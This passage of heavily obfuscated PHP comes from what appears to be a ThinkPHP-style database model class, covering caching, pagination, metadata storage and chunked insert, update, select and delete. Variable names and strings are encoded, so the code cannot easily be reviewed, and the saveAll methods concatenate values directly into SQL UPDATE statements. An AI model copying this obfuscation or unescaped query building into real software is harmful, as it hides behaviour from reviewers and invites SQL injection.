return $_SERVER[•Ùç É][99]; }, $½Ó¿í—Ø); return json_decode($½Ó¿í—Ø); } public function setAutoIncrement($œÖ°ã±”) { $œ»“ª¼‹ = array($this->getPk() => $œÖ°ã±”); $®ˆ¹·İ³ = $this->data($œ»“ª¼‹)->add(); if ($®ˆ¹·İ³) { $this->delete($®ˆ¹·İ³); } } public function getAutoIncrement() { $õÌğĞæ = $this->getTableName(); $­†Ê…ñÅ = $this->max($this->getPk()); $ĞÄ¢ïœØ = $this->query("\163\x68\x6f\167\40\x74\x61\142\x6c\145\x20\163\x74\141\164\x75\x73\x20\x77\x68\x65\x72\x65\40\116\141\155\145\x3d\47{$õÌğĞæ}\x27"); $Åâ˜ˆÆ– = $ĞÄ¢ïœØ[0][$_SERVER[•Ùç É][406]]; $¨«¤“¤¾ = max($­†Ê…ñÅ, $Åâ˜ˆÆ–); return $¨«¤“¤¾; } protected function _callBefore($Ìçüº “, $ô¤é„ğé) { return $this->cacheCallCheck($Ìçüº “, $ô¤é„ğé, !1); } protected function _callAfter($íİêş, $»œş¢¨Ô) { return $this->cacheCallCheck($íİêş, $»œş¢¨Ô, !0); } protected function cacheFunctionAlias($ÆÓæ‰¥í) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($—®æœˆŒ, $½Á«±ˆ†, $„Û®§Â¿ = false) { $®ŸÙğÄ¯ = $this->cacheFunctionAlias($½Á«±ˆ†); if (!$®ŸÙğÄ¯) { return; } foreach ($®ŸÙğÄ¯ as $é¯›Ÿëï => $½”ŒÁÎ) { $˜‡óïê£ = $½”ŒÁÎ[0]; $Ã«Ğ¼†² = explode($_SERVER[•Ùç É][50], $½”ŒÁÎ[1]); if ($—®æœˆŒ == $é¯›Ÿëï) { return $this->cacheFunctionGet($é¯›Ÿëï, $˜‡óïê£); } if ($„Û®§Â¿ && in_array($—®æœˆŒ, $Ã«Ğ¼†²)) { $this->cacheFunctionClear($é¯›Ÿëï, $˜‡óïê£); } } } public function cacheFunctionGet($ŸÅÖ±ªü, $²Æíß°) { $ŞËöÊÀ = $this->cacheKeyMake($ŸÅÖ±ªü, $²Æíß°); $Ñ·šŠˆº = Cache::get($ŞËöÊÀ); if (!is_array($Ñ·šŠˆº)) { $Ñ·šŠˆº = call_user_func_array(array($this, $ŸÅÖ±ªü), array($²Æíß°, !0)); Cache::set($ŞËöÊÀ, $Ñ·šŠˆº); } return $Ñ·šŠˆº; } public function cacheFunctionClear($’ıŒ»Ñû, $‹º¥ÀÖå) { $ù­´ŒÈ = $‹º¥ÀÖå; if (!is_array($‹º¥ÀÖå)) { $ù­´ŒÈ = array($‹º¥ÀÖå); } foreach ($ù­´ŒÈ as $üşø¾È) { $Ğùü‘‰ = $this->cacheKeyMake($’ıŒ»Ñû, $üşø¾È); Cache::remove($Ğùü‘‰); } } private function cacheKeyMake($ë×ñìÖ, $¾¡Š•ŒÑ) { $´×¢…Ş… =& $_SERVER[•Ùç É]; return get_class($this) . $´×¢…Ş…[11] . $ë×ñìÖ . $´×¢…Ş…[407] . $¾¡Š•ŒÑ; } protected function selectPageReset() { $“‰ïÅÑƒ =& $_SERVER[•Ùç É]; if (isset($GLOBALS[$“‰ïÅÑƒ[408]])) { return; } $GLOBALS[$“‰ïÅÑƒ[408]] = isset($GLOBALS[$“‰ïÅÑƒ[7]][$“‰ïÅÑƒ[409]]) ? $GLOBALS[$“‰ïÅÑƒ[7]][$“‰ïÅÑƒ[409]] : !1; $GLOBALS[$“‰ïÅÑƒ[410]] = isset($GLOBALS[$“‰ïÅÑƒ[7]][$“‰ïÅÑƒ[399]]) ? $GLOBALS[$“‰ïÅÑƒ[7]][$“‰ïÅÑƒ[399]] : !1; $GLOBALS[$“‰ïÅÑƒ[7]][$“‰ïÅÑƒ[409]] = !1; $GLOBALS[$“‰ïÅÑƒ[7]][$“‰ïÅÑƒ[399]] = !1; } protected function selectPageRestore() { $É¼åÔñ =& $_SERVER[•Ùç É]; if (!isset($GLOBALS[$É¼åÔñ[408]])) { return; } $GLOBALS[$É¼åÔñ[7]][$É¼åÔñ[409]] = $GLOBALS[$É¼åÔñ[408]]; $GLOBALS[$É¼åÔñ[7]][$É¼åÔñ[399]] = $GLOBALS[$É¼åÔñ[410]]; if ($GLOBALS[$É¼åÔñ[7]][$É¼åÔñ[409]] === !1) { unset($GLOBALS[$É¼åÔñ[7]][$É¼åÔñ[409]]); } if ($GLOBALS[$É¼åÔñ[7]][$É¼åÔñ[399]] === !1) { unset($GLOBALS[$É¼åÔñ[7]][$É¼åÔñ[399]]); } unset($GLOBALS[$É¼åÔñ[408]]); unset($GLOBALS[$É¼åÔñ[410]]); } protected function selectPage($šš‡ØÕİ = 200, $çå£Ø¬” = 1) { $¬‹æ’Û =& $_SERVER[•Ùç É]; global $in; $£œøüË = $this->optionsValue(); $Ñ´›’ç‘ = 50000; $šš‡ØÕİ = isset($in[$¬‹æ’Û[409]]) && $in[$¬‹æ’Û[409]] ? $in[$¬‹æ’Û[409]] : $šš‡ØÕİ; if ($šš‡ØÕİ === -1) { $in[$¬‹æ’Û[409]] = !1; $Ñ´›’ç‘ = 100000000; $šš‡ØÕİ = $Ñ´›’ç‘; } $Ìë»Ğæ® = $£œøüË; $Ìë»Ğæ®[$¬‹æ’Û[411]] = array(); $šš‡ØÕİ = intval($šš‡ØÕİ); $šš‡ØÕİ = $šš‡ØÕİ <= 5 ? 5 : ($šš‡ØÕİ >= $Ñ´›’ç‘ ? $Ñ´›’ç‘ : $šš‡ØÕİ); $çå£Ø¬” = intval(isset($in[$¬‹æ’Û[399]]) && $in[$¬‹æ’Û[399]] ? $in[$¬‹æ’Û[399]] : $çå£Ø¬”); $çå£Ø¬” = $çå£Ø¬” <= 1 ? 1 : $çå£Ø¬”; $ÒˆŒÚµÜ = array(); $ª­’õÇ¢ = 1; if ($çå£Ø¬” == 1 && $ª­’õÇ¢) { $this->optionsValue($£œøüË); $ÒˆŒÚµÜ = $this->page($çå£Ø¬”, $šš‡ØÕİ)->select(); $Í¿ìı‹¢ = is_array($ÒˆŒÚµÜ) ? count($ÒˆŒÚµÜ) : 0; if ($Í¿ìı‹¢ < $šš‡ØÕİ) { $Á‚¿·Ç± = 1; } else { $this->optionsValue($Ìë»Ğæ®); $Í¿ìı‹¢ = intval($this->count()); $Á‚¿·Ç± = ceil($Í¿ìı‹¢ / $šš‡ØÕİ); } } else { $this->optionsValue($Ìë»Ğæ®); $Í¿ìı‹¢ = intval($this->count()); $Á‚¿·Ç± = ceil($Í¿ìı‹¢ / $šš‡ØÕİ); $çå£Ø¬” = $çå£Ø¬” >= $Á‚¿·Ç± ? $Á‚¿·Ç± : $çå£Ø¬”; $this->optionsValue($£œøüË); $ÒˆŒÚµÜ = $this->page($çå£Ø¬”, $šš‡ØÕİ)->select(); } if (!is_array($ÒˆŒÚµÜ)) { $ÒˆŒÚµÜ = array(); } if ($Á‚¿·Ç± == 1) { $Í¿ìı‹¢ = count($ÒˆŒÚµÜ); } $ŸÙ¡Êçù = array($¬‹æ’Û[412] => array($¬‹æ’Û[413] => $Í¿ìı‹¢, $¬‹æ’Û[409] => $šš‡ØÕİ, $¬‹æ’Û[399] => $çå£Ø¬”, $¬‹æ’Û[414] => $Á‚¿·Ç±), $¬‹æ’Û[415] => $ÒˆŒÚµÜ); return $ŸÙ¡Êçù; } protected function checkLength($º¬ˆÅñ, $£Æ²†“ƒ = 0, $›Œ¯Ÿ = '') { $É²ÍŠÃ =& $_SERVER[•Ùç É]; $£Æ²†“ƒ = $£Æ²†“ƒ ? $£Æ²†“ƒ : 65536; if (!$º¬ˆÅñ || strlen($º¬ˆÅñ) < $£Æ²†“ƒ) { return; } $›Œ¯Ÿ = $›Œ¯Ÿ ? $›Œ¯Ÿ . $É²ÍŠÃ[73] : $É²ÍŠÃ[12]; show_json($›Œ¯Ÿ . LNG($É²ÍŠÃ[416]) . "\50{$£Æ²†“ƒ}\x29", !1); } protected function metaSet($ó´¹¿”Ñ, $Ô¥Œ¿½÷ = null, $³ ‹ôŒ“ = null) { $ğòŠŠç  =& $_SERVER[•Ùç É]; if (!$this->tableMeta || !$ó´¹¿”Ñ) { return !1; } $ĞÛŠ¦Ç = $this->tableMeta[$ğòŠŠç [417]]; $¦ßÎÜıà = $this->tableMeta[$ğòŠŠç [418]]; $®Û¯İÕ = Model($¦ßÎÜıà); $Ãã˜à‹² = array($ĞÛŠ¦Ç => $ó´¹¿”Ñ, $ğòŠŠç [419] => $Ô¥Œ¿½÷); if (is_null($Ô¥Œ¿½÷)) { return $®Û¯İÕ->where(array($ĞÛŠ¦Ç => $ó´¹¿”Ñ))->delete(); } if (is_null($³ ‹ôŒ“) && is_string($Ô¥Œ¿½÷)) { return $®Û¯İÕ->where($Ãã˜à‹²)->delete(); } $à‹äÒŒî = is_array($Ô¥Œ¿½÷) ? $Ô¥Œ¿½÷ : array(); if (is_string($Ô¥Œ¿½÷)) { $à‹äÒŒî[$Ô¥Œ¿½÷] = $³ ‹ôŒ“; } $ÎùÖÎ¼µ = array(); foreach ($à‹äÒŒî as $îõïœÁÓ => $öŠöï“) { if (is_null($öŠöï“) && is_string($îõïœÁÓ)) { $®Û¯İÕ->where(array($ĞÛŠ¦Ç => $ó´¹¿”Ñ, $ğòŠŠç [419] => $îõïœÁÓ))->delete(); continue; } $this->checkLength($öŠöï“, !1, $¦ßÎÜıà . $ğòŠŠç [4] . $îõïœÁÓ); $ÎùÖÎ¼µ[] = array($ĞÛŠ¦Ç => $ó´¹¿”Ñ, $ğòŠŠç [96] => $îõïœÁÓ, $ğòŠŠç [420] => $öŠöï“); } $ÄÜ˜¾¦Î = $ğòŠŠç [421] . $¦ßÎÜıà; CacheLock::lock($ÄÜ˜¾¦Î); $®Û¯İÕ->where(array($ĞÛŠ¦Ç => $ó´¹¿”Ñ))->addAll($ÎùÖÎ¼µ, array(), !0); CacheLock::unlock($ÄÜ˜¾¦Î); return !0; } public function metaGet($×­‘Ïäˆ, $Ë ƒÖìö = false) { $í¼Ã¹¥ =& $_SERVER[•Ùç É]; if (!$this->tableMeta) { return array(); } $Èçë¬éî = $this->tableMeta[$í¼Ã¹¥[417]]; $¦õ„˜£» = Model($this->tableMeta[$í¼Ã¹¥[418]]); if ($Ë ƒÖìö) { $á…ï° = array($Èçë¬éî => $×­‘Ïäˆ, $í¼Ã¹¥[96] => $Ë ƒÖìö); return $¦õ„˜£»->where($á…ï°)->getField($í¼Ã¹¥[420]); } $á…ï° = array($Èçë¬éî => $×­‘Ïäˆ); $¤Š¹¯à = $¦õ„˜£»->field($í¼Ã¹¥[422])->where($á…ï°)->select(); $¤Š¹¯à = array_to_keyvalue($¤Š¹¯à, $í¼Ã¹¥[96], $í¼Ã¹¥[420]); return $¤Š¹¯à; } private function checkDataAutoHas($áõıí¸ú) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Üí±Å) { if (in_array($áõıí¸ú, explode($_SERVER[•Ùç É][50], $Üí±Å[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ë—†’¼¿, $Š®âş¹·) { $Û’¤Â =& $_SERVER[•Ùç É]; if (!is_array($ë—†’¼¿)) { return; } foreach ($this->dataAuto as $¦úÀ×í«) { $ş­Š´”ê = $¦úÀ×í«[0]; if (!in_array($Š®âş¹·, explode($Û’¤Â[50], $¦úÀ×í«[2]))) { continue; } switch (trim($¦úÀ×í«[3])) { case $Û’¤Â[367]: case $Û’¤Â[368]: $«º†ã = $¦úÀ×í«[1]; $÷ó‚›¿³ = isset($¦úÀ×í«[4]) ? (array) $¦úÀ×í«[4] : array(); if ($«º†ã == $Û’¤Â[196] && array_key_exists($ş­Š´”ê, $ë—†’¼¿)) { if (!$ë—†’¼¿[$ş­Š´”ê]) { unset($ë—†’¼¿[$ş­Š´”ê]); } break; } if (isset($ë—†’¼¿[$ş­Š´”ê])) { array_unshift($÷ó‚›¿³, $ë—†’¼¿[$ş­Š´”ê]); } if ($Û’¤Â[367] == $¦úÀ×í«[3]) { $ë—†’¼¿[$ş­Š´”ê] = call_user_func_array($«º†ã, $÷ó‚›¿³); } else { $ë—†’¼¿[$ş­Š´”ê] = call_user_func_array(array(&$this, $«º†ã), $÷ó‚›¿³); } break; case $Û’¤Â[316]: if (isset($ë—†’¼¿[$ş­Š´”ê]) && $ë—†’¼¿[$ş­Š´”ê]) { $ë—†’¼¿[$ş­Š´”ê] = call_user_func_array(array(&$this, $¦úÀ×í«[1]), array($ë—†’¼¿[$ş­Š´”ê])); } break; case $Û’¤Â[319]: $ë—†’¼¿[$ş­Š´”ê] = $ë—†’¼¿[$¦úÀ×í«[1]]; break; case $Û’¤Â[340]: if (isset($ë—†’¼¿[$ş­Š´”ê]) && !is_string($ë—†’¼¿[$ş­Š´”ê])) { $ë—†’¼¿[$ş­Š´”ê] = json_encode_force($ë—†’¼¿[$ş­Š´”ê]); } break; case $Û’¤Â[369]: if ($ë—†’¼¿[$ş­Š´”ê] === $Û’¤Â[12]) { unset($ë—†’¼¿[$ş­Š´”ê]); } break; case $Û’¤Â[370]: $ë—†’¼¿[$ş­Š´”ê] = $¦úÀ×í«[1]; default: break; } } if ($Š®âş¹· == $Û’¤Â[401]) { $¬µ Äì = strtolower($this->db->getDbType()); if (strpos($¬µ Äì, $Û’¤Â[13]) !== 0) { return; } $¶÷ï…á = $this->field(!0)->fields; $ğÔë«¦ = $¶÷ï…á[$Û’¤Â[298]]; if (isset($¶÷ï…á[$Û’¤Â[297]])) { unset($ğÔë«¦[$¶÷ï…á[$Û’¤Â[297]]]); } foreach ($ğÔë«¦ as $€ÜÖíƒ => $Š®âş¹·) { if (!isset($ë—†’¼¿[$€ÜÖíƒ])) { $ë—†’¼¿[$€ÜÖíƒ] = $Û’¤Â[12]; } } } } private function dataAfterFilter(&$ÃÌ¦ò½) { $–ÓÆ¹ù— =& $_SERVER[•Ùç É]; foreach ($this->dataAuto as $ìÙêÆ„”) { $¹Ç¶…²œ = $ìÙêÆ„”[0]; if (!isset($ÃÌ¦ò½[$¹Ç¶…²œ])) { continue; } if (!in_array($–ÓÆ¹ù—[403], explode($–ÓÆ¹ù—[50], $ìÙêÆ„”[2]))) { continue; } switch (trim($ìÙêÆ„”[3])) { case $–ÓÆ¹ù—[367]: case $–ÓÆ¹ù—[368]: $ğ» §Š¯ = isset($ìÙêÆ„”[4]) ? (array) $ìÙêÆ„”[4] : array(); array_unshift($ğ» §Š¯, $ÃÌ¦ò½[$¹Ç¶…²œ]); if (isset($ìÙêÆ„”[4]) && $ìÙêÆ„”[4] == $–ÓÆ¹ù—[423]) { $ğ» §Š¯ = array($ÃÌ¦ò½[$¹Ç¶…²œ]); } if ($–ÓÆ¹ù—[367] == $ìÙêÆ„”[3]) { $ÃÌ¦ò½[$¹Ç¶…²œ] = call_user_func_array($ìÙêÆ„”[1], $ğ» §Š¯); } else { $ÃÌ¦ò½[$¹Ç¶…²œ] = call_user_func_array(array(&$this, $ìÙêÆ„”[1]), $ğ» §Š¯); } break; case $–ÓÆ¹ù—[316]: if (isset($ÃÌ¦ò½[$¹Ç¶…²œ]) && $ÃÌ¦ò½[$¹Ç¶…²œ]) { $ÃÌ¦ò½[$¹Ç¶…²œ] = call_user_func_array(array(&$this, $ìÙêÆ„”[1]), array($ÃÌ¦ò½[$¹Ç¶…²œ])); } break; case $–ÓÆ¹ù—[319]: $ÃÌ¦ò½[$¹Ç¶…²œ] = $ÃÌ¦ò½[$ìÙêÆ„”[1]]; break; case $–ÓÆ¹ù—[340]: $Äô´Ÿ€Î = $ÃÌ¦ò½[$¹Ç¶…²œ]; $ÃÌ¦ò½[$¹Ç¶…²œ] = json_decode($Äô´Ÿ€Î, !0); if (is_null($ÃÌ¦ò½[$¹Ç¶…²œ])) { $ÃÌ¦ò½[$¹Ç¶…²œ] = $Äô´Ÿ€Î; } break; case $–ÓÆ¹ù—[369]: if ($ÃÌ¦ò½[$¹Ç¶…²œ] === $–ÓÆ¹ù—[12]) { unset($ÃÌ¦ò½[$¹Ç¶…²œ]); } break; case $–ÓÆ¹ù—[370]: $ÃÌ¦ò½[$¹Ç¶…²œ] = $ìÙêÆ„”[1]; break; default: break; } } } public function saveAll($äŸã¾×è) { $œŞàÄ²Ö =& $_SERVER[•Ùç É]; $æñ¸¼”» = $this->tablePrefix . $this->tableName; $˜½ˆŠéĞ = self::SQL_WHERE_IN_CHUNK; $äŸã¾×è = is_array($äŸã¾×è) ? $äŸã¾×è : array(); $Üá°ôè = $œŞàÄ²Ö[424]; $äŞ¾Àø = 0; $ºñÆéì = array(); $®Ø³ïìÈ = count($äŸã¾×è); for ($é×ŞÊÜ³ = 0; $é×ŞÊÜ³ < $®Ø³ïìÈ; $é×ŞÊÜ³++) { $§Ú—œÄÚ = $äŸã¾×è[$é×ŞÊÜ³]; if (!is_array($§Ú—œÄÚ) || count($§Ú—œÄÚ) != 4) { continue; } $×¬ÁÜ§â = "\125\x50\104\x41\x54\x45\40\x60{$æñ¸¼”»}\x60\40\x53\105\x54\40{$§Ú—œÄÚ[2]}\40\x3d\x20\103\x41\123\x45\40{$§Ú—œÄÚ[0]}\40\12"; if ($äŞ¾Àø == 0) { $Üá°ôè = $×¬ÁÜ§â; } $ºñÆéì[] = $œŞàÄ²Ö[120] . $§Ú—œÄÚ[1] . $œŞàÄ²Ö[120]; $äŞ¾Àø++; $Üá°ôè .= "\40\127\110\105\116\x20\x27{$§Ú—œÄÚ[1]}\x27\x20\x54\110\105\116\x20\47{$§Ú—œÄÚ[3]}\47\40\xa"; if ($äŞ¾Àø == $˜½ˆŠéĞ || $é×ŞÊÜ³ == $®Ø³ïìÈ - 1) { $À´Ì¬Í = implode($œŞàÄ²Ö[50], $ºñÆéì); $Üá°ôè .= "\40\105\x4e\104\x20\40\127\110\105\x52\105\x20{$§Ú—œÄÚ[0]}\40\111\116\x20\50{$À´Ì¬Í}\51\x20"; $this->execute($Üá°ôè); $äŞ¾Àø = 0; $Üá°ôè = $×¬ÁÜ§â; $this->chunkEventCheck(count($ºñÆéì)); $ºñÆéì = array(); } } $this->chunkEventSet(); } public function saveAllEach($­Ñü£¡É) { $¦˜£ûÂ§ =& $_SERVER[•Ùç É]; $½·¨—Òã = $this->tablePrefix . $this->tableName; foreach ($­Ñü£¡É as $Ìš¾Ş«‡) { if (!is_array($Ìš¾Ş«‡) || count($Ìš¾Ş«‡) != 4) { continue; } $ßòÛîŒ‘ = $Ìš¾Ş«‡[0] . $¦˜£ûÂ§[425] . $Ìš¾Ş«‡[1] . $¦˜£ûÂ§[120]; $‡¤“Óå¼ = $Ìš¾Ş«‡[2] . $¦˜£ûÂ§[425] . $Ìš¾Ş«‡[3] . $¦˜£ûÂ§[120]; $„ı¥Şãâ = "\165\160\144\x61\164\145\40{$½·¨—Òã}\x20\163\145\x74\x20{$‡¤“Óå¼}\x20\x77\150\145\162\x65\x20{$ßòÛîŒ‘}\73"; $this->execute($„ı¥Şãâ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‰İëÖ­ = false, $ùÔÃ†ØÌ = false) { $this->_chunkEvent = $‰İëÖ­; $this->_chunkEventParam = $ùÔÃ†ØÌ; } private function chunkEventCheck($ê¾Á•¬ğ) { if (!$this->_chunkEvent) { return; } $§ˆğÖ‹ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $§ˆğÖ‹[$_SERVER[•Ùç É][426]] = $ê¾Á•¬ğ; Hook::trigger($this->_chunkEvent, $§ˆğÖ‹); } public function addAll($•ªŞ«³³, $Á¤¶ñÊŸ = array(), $Æà»İ„â = false) { $¸à”¸Šâ =& $_SERVER[•Ùç É]; ignore_timeout(); $ï“¢Ò– = self::SQL_WHERE_IN_CHUNK; if (empty($•ªŞ«³³)) { $this->error = think_lang($¸à”¸Šâ[317]); return !1; } $Á¤¶ñÊŸ = $this->_parseOptions($Á¤¶ñÊŸ); foreach ($•ªŞ«³³ as $ÉÑ…œ¥… => $µÒ­áÕÒ) { $•ªŞ«³³[$ÉÑ…œ¥…] = $this->_facade($µÒ­áÕÒ); $this->_beforeInsert($•ªŞ«³³[$ÉÑ…œ¥…], $Á¤¶ñÊŸ); } if (method_exists($this->db, $¸à”¸Šâ[318])) { for ($Û‚Á´ ¬ = 0; $Û‚Á´ ¬ < count($•ªŞ«³³); $Û‚Á´ ¬ += $ï“¢Ò–) { $÷à’¾ß¬ = array_slice($•ªŞ«³³, $Û‚Á´ ¬, $ï“¢Ò–); if (!is_array($÷à’¾ß¬) || count($÷à’¾ß¬) == 0) { break; } $ğˆº‹ÅÖ = $this->db->insertAll($÷à’¾ß¬, $Á¤¶ñÊŸ, $Æà»İ„â); $this->chunkEventCheck(count($÷à’¾ß¬)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($•ªŞ«³³ as $ÉÑ…œ¥… => $µÒ­áÕÒ) { $ğˆº‹ÅÖ = $this->db->insert($µÒ­áÕÒ, $Á¤¶ñÊŸ, $Æà»İ„â); } $this->commit(); } if (!1 !== $ğˆº‹ÅÖ) { $Œµãó¹ = $this->getLastInsID(); if ($Œµãó¹) { return $Œµãó¹; } } return $ğˆº‹ÅÖ; } public function save($¦­Ê¡ı÷ = '', $¨¶Ÿª±È = array()) { $Ì‘ô´Šø =& $_SERVER[•Ùç É]; $ÁØ–ÕŠ§ = self::SQL_WHERE_IN_CHUNK; $²ÁÌ’ÌÆ = $this->optionsValue(); $é«í­íâ = $this->findWhereField($²ÁÌ’ÌÆ); if (!$é«í­íâ) { return parent::save($¦­Ê¡ı÷, $¨¶Ÿª±È); } $ûµÌÍŠÚ = 0; $¼õ›ÂŞŠ = $²ÁÌ’ÌÆ[$Ì‘ô´Šø[321]][$é«í­íâ][1]; $¼õ›ÂŞŠ = is_array($¼õ›ÂŞŠ) ? $¼õ›ÂŞŠ : array(); $š€ãÒóë = count($¼õ›ÂŞŠ); for ($¹Ûüô²ú = 0; $¹Ûüô²ú < $š€ãÒóë; $¹Ûüô²ú += $ÁØ–ÕŠ§) { $ú¶ƒÄ• = array_slice($¼õ›ÂŞŠ, $¹Ûüô²ú, $ÁØ–ÕŠ§); if (!is_array($ú¶ƒÄ•) || count($ú¶ƒÄ•) == 0) { break; } $²ÁÌ’ÌÆ[$Ì‘ô´Šø[321]][$é«í­íâ][1] = $ú¶ƒÄ•; $this->optionsValue($²ÁÌ’ÌÆ); $ûµÌÍŠÚ += parent::save($¦­Ê¡ı÷, $¨¶Ÿª±È); $this->chunkEventCheck(count($ú¶ƒÄ•)); } $this->chunkEventSet(); return $ûµÌÍŠÚ; } public function add($¤Õô¼ñŒ = '', $óØ©„·¤ = array(), $” ›™ºô = false) { if ($this->addTaskStatus && is_array($¤Õô¼ñŒ)) { $this->addTaskData[] = $¤Õô¼ñŒ; return; } return parent::add($¤Õô¼ñŒ, $óØ©„·¤, $” ›™ºô); } public function parseWhereLike($¾Õ¸ºäË, $ª‹» = '', $Ú˜µğÑù = false, &$†Íìó¸ = false) { $¾¡´­™‰ =& $_SERVER[•Ùç É]; $÷òÈ¹Ÿñ = $GLOBALS[$¾¡´­™‰[6]][$¾¡´­™‰[427]]; if (!$÷òÈ¹Ÿñ[$¾¡´­™‰[428]]) { return $¾Õ¸ºäË; } if (!is_array($¾Õ¸ºäË)) { return $¾Õ¸ºäË; } $Ë»‰üî = array(); $Ö¶Şá±Ò = 0; foreach ($¾Õ¸ºäË as $µì’êêñ => $„³åÀÅ) { if (is_array($„³åÀÅ) && count($„³åÀÅ) == 2 && $„³åÀÅ[0] == $¾¡´­™‰[429] && is_string($„³åÀÅ[1]) && substr($„³åÀÅ[1], 0, 1) == $¾¡´­™‰[430] && substr($„³åÀÅ[1], strlen($„³åÀÅ[1]) - 1, 1) == $¾¡´­™‰[430]) { $†Íìó¸ = !0; $Ó­íæ”ë = is_string($µì’êêñ) ? $µì’êêñ : $ª‹»; $¯ü…ÇüŞ = substr($„³åÀÅ[1], 1, strlen($„³åÀÅ[1]) - 2); $¯ü…ÇüŞ = $this->db->escapeString($¯ü…ÇüŞ); if (!strpos($Ó­íæ”ë, $¾¡´­™‰[10])) { $Ó­íæ”ë = $¾¡´­™‰[431] . $Ó­íæ”ë . $¾¡´­™‰[431]; } $Ö†Ï‘Ú = $¾¡´­™‰[205] . $¯ü…ÇüŞ . $¾¡´­™‰[205]; $¯ü…ÇüŞ = str_replace(array($¾¡´­™‰[10], $¾¡´­™‰[432], $¾¡´­™‰[11]), $¾¡´­™‰[433], $¯ü…ÇüŞ); if ($÷òÈ¹Ÿñ[$¾¡´­™‰[434]]) { $Ö†Ï‘Ú = $¾¡´­™‰[435] . $¯ü…ÇüŞ . $¾¡´­™‰[436]; if ($÷òÈ¹Ÿñ[$¾¡´­™‰[437]]) { $Ö†Ï‘Ú = $¾¡´­™‰[436] . $¯ü…ÇüŞ . $¾¡´­™‰[435]; } } $Ë»‰üî[$Ö¶Şá±Ò] = $¾¡´­™‰[438] . $Ó­íæ”ë . $¾¡´­™‰[439] . $Ö†Ï‘Ú . $¾¡´­™‰[440]; $Ö¶Şá±Ò++; continue; } if (is_array($„³åÀÅ)) { $ª‹» = is_string($µì’êêñ) ? $µì’êêñ : $ª‹»; $„³åÀÅ = $this->parseWhereLike($„³åÀÅ, $ª‹», !0, $†Íìó¸); } if (is_numeric($µì’êêñ)) { $Ë»‰üî[$Ö¶Şá±Ò] = $„³åÀÅ; $Ö¶Şá±Ò++; } else { $Ë»‰üî[$µì’êêñ] = $„³åÀÅ; } } if ($†Íìó¸ && !$Ú˜µğÑù) { } return $Ë»‰üî; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Â¨Ç·Ä® = array()) { $‰øèà»Ê =& $_SERVER[•Ùç É]; $±ôãàìã = self::SQL_WHERE_IN_CHUNK; $ÜèÍß© = $this->optionsValue(); $õËÆË™ = $this->findWhereField($ÜèÍß©); if (!$õËÆË™ || isset($ÜèÍß©[$‰øèà»Ê[338]]) || isset($ÜèÍß©[$‰øèà»Ê[399]])) { return parent::select($Â¨Ç·Ä®); } $Íí¯úˆ = $ÜèÍß©[$‰øèà»Ê[321]][$õËÆË™][1]; $Íí¯úˆ = is_array($Íí¯úˆ) ? $Íí¯úˆ : array(); $ıÎéÍò‡ = null; for ($èÖùû‰³ = 0; $èÖùû‰³ < count($Íí¯úˆ); $èÖùû‰³ += $±ôãàìã) { $ãôÑø—º = array_slice($Íí¯úˆ, $èÖùû‰³, $±ôãàìã); if (!is_array($ãôÑø—º) || count($ãôÑø—º) == 0) { break; } $ÜèÍß©[$‰øèà»Ê[321]][$õËÆË™][1] = $ãôÑø—º; $this->optionsValue($ÜèÍß©); $áâ¾ÊÂ· = parent::select($Â¨Ç·Ä®); if (!$áâ¾ÊÂ·) { continue; } $ıÎéÍò‡ = is_array($ıÎéÍò‡) ? $ıÎéÍò‡ : array(); $ıÎéÍò‡ = array_merge($ıÎéÍò‡, $áâ¾ÊÂ·); } return $ıÎéÍò‡; } public function delete($ÑŒÆ•— = array()) { $ùö‰¬’É =& $_SERVER[•Ùç É]; $Ø–†šìğ = self::SQL_WHERE_IN_CHUNK; $Üã“¯øŞ = $this->optionsValue(); $ìÙ†áÙ‹ = $this->findWhereField($Üã“¯øŞ); if (!$ìÙ†áÙ‹) { return parent::delete($ÑŒÆ•—); } $ÏÛ¶•Èâ = 0; $±áÒ²Í¹ = $Üã“¯øŞ[$ùö‰¬’É[321]][$ìÙ†áÙ‹][1]; $±áÒ²Í¹ = is_array($±áÒ²Í¹) ? $±áÒ²Í¹ : array(); for ($¨ƒçå˜­ = 0; $¨ƒçå˜­ < count($±áÒ²Í¹); $¨ƒçå˜­ += $Ø–†šìğ) { $øôÓÇ  = array_slice($±áÒ²Í¹, $¨ƒçå˜­, $Ø–†šìğ); if (!is_array($øôÓÇ ) || count($øôÓÇ ) == 0) { break; } $Üã“¯øŞ[$ùö‰¬’É[321]][$ìÙ†áÙ‹][1] = $øôÓÇ ; $this->optionsValue($Üã“¯øŞ); $ÏÛ¶•Èâ += parent::delete($ÑŒÆ•—); } return $ÏÛ¶•Èâ; } private function findWhereField($¡şÁ½²’) { $øïöñú =& $_SERVER[•Ùç É]; $ƒãÒ¯¤¼ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¡şÁ½²’) || !is_array($¡şÁ½²’[$øïöñú[321]])) { return !1; } foreach ($¡şÁ½²’[$øïöñú[321]] as $Á©İ¡¸ => $±¶ÖğŸ“) { if (is_array($±¶ÖğŸ“) && isset($±¶ÖğŸ“[0]) && is_string($±¶ÖğŸ“[0]) && strtolower($±¶ÖğŸ“[0]) == $øïöñú[7] && is_array($±¶ÖğŸ“[1]) && count($±¶ÖğŸ“[1]) > $ƒãÒ¯¤¼) { ignore_timeout(); return $Á©İ¡¸; } } return !1; } public function setMasterDB($Ñ•ƒâ¥Œ = true) { think_config($_SERVER[•Ùç É][441], $Ñ•ƒâ¥Œ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\145\x6d\x4f\x70\164\151\157\156"; public $field = array(); public function listData($âıÇï” = false, $£ô‡äÇË = "\x6d\x6f\144\x69\x66\171\124\x69\x6d\145", $ôª»±«ü = false) { $¡Şûú’ = Model($this->modelType)->get(!1, $this->optionType, !0); $¹­¿ëòÃ = array_values($¡Şûú’); if ($¹­¿ëòÃ && $¹­¿ëòÃ[0] && !is_array($¹­¿ëòÃ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¡Şûú’ = 